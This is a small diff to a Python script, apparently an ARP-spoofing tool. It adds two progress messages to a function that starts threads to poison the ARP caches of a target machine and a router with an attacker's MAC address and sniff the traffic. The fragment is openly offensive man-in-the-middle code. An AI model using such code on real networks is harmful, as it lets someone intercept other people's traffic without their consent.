@@ -24,7 +24,9 @@ def scan_function():
 
 def start_arp_poison(target_ip, target_mac, router_ip, attacker_mac, router_mac):
     sniff_thread = threading.Thread(target=scan_function, daemon=True)
+    print("Starting thread to poison target...")
     poison_device_thread = threading.Thread(target=arp_poison, args=(target_ip,router_ip,target_mac,attacker_mac), daemon=True)
+    print("Starting thread to poison router...")
     poison_router_thread = threading.Thread(target=arp_poison, args=(router_ip, target_ip,router_mac, attacker_mac), daemon=True)
     poison_device_thread.start()
     poison_router_thread.start()
